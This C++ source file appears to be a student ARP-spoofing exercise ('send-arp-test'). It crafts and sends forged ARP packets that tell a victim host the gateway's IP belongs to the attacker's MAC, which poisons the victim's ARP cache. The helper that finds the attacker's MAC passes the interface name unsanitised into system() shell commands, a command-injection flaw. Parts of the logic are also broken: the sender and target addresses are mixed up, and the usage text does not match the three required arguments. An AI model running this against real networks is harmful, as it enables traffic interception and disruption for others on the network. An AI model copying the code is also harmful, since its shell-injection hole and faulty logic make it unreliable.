#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

//include for MAC
#include <iostream>
#include <cstdlib>
#include <string>

#define MAC_ADDR_LEN 6


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


//Attacker MAC function
std::string getMacAddress(const std::string& interfaceName) {
    std::string command = "ifconfig " + interfaceName;

    // run sys command and set temp file for result
    std::string tmpFileName = "/tmp/mac_addr_output.txt";
    command += " > " + tmpFileName;

    //run system command
    int result = system(command.c_str());

    std::string macAddress;
    if (result == 0) {
        // command is success, read MAC addr in file
        std::string readCommand = "grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' " + tmpFileName;
        FILE* file = popen(readCommand.c_str(), "r");
        char buffer[18];
        if (file) {
            if (fgets(buffer, sizeof(buffer), file) != nullptr) {
                macAddress = buffer;
            }
            pclose(file);
        }
    }
    //remove temp_file
    std::string removeCommand = "rm " + tmpFileName;
    system(removeCommand.c_str());

    return macAddress;
}

std::string getSMAC(const std::string& sip, const std::string& interfaceName, const std::string& myMacAddress, const std::string& gatewayIp){
        std::string smac;


	char errbuf[PCAP_ERRBUF_SIZE];
		//패킷을 받기 위함
        pcap_t* handle = pcap_open_live(interfaceName.c_str(), BUFSIZ, 1, 1, errbuf);
        
        EthArpPacket normal_packet;

        normal_packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); //브로드 캐스트로 뿌림
        normal_packet.eth_.smac_ = Mac(myMacAddress);
        normal_packet.eth_.type_ = htons(EthHdr::Arp);

        normal_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        normal_packet.arp_.pro_ = htons(EthHdr::Ip4);
        normal_packet.arp_.hln_ = Mac::SIZE;
        normal_packet.arp_.pln_ = Ip::SIZE;
        normal_packet.arp_.op_ = htons(ArpHdr::Request);
		
		
        normal_packet.arp_.smac_ = Mac(myMacAddress);
        normal_packet.arp_.sip_ = htonl(Ip(sip)); //victim주소
        normal_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        normal_packet.arp_.tip_ = htonl(Ip(gatewayIp)); //게이트웨이 IP

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&normal_packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
		else {
			// ARP 응답 패킷을 받아옵니다. (예시이므로 실제로는 timeout 등을 고려해야 합니다.)
			struct pcap_pkthdr* header;
			const u_char* packet;
			res = pcap_next_ex(handle, &header, &packet);
			if (res == 1) {
				// 패킷 수신에 성공한 경우, ARP 응답 패킷에서 해당 IP 주소의 MAC 주소를 추출합니다.
				EthArpPacket* arpResponsePacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
				smac = std::string(arpResponsePacket->arp_.smac_);
			}
		}


        pcap_close(handle);


        return smac;
    }

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	//get Attacker MAC
	std::string macAddress = getMacAddress(argv[1]);


	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(getSMAC(argv[2],argv[1],macAddress,argv[3]));
	packet.eth_.smac_ = Mac(macAddress);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(macAddress);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(getSMAC(argv[2],argv[1],macAddress,argv[3]));
	packet.arp_.tip_ = htonl(Ip(argv[2]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
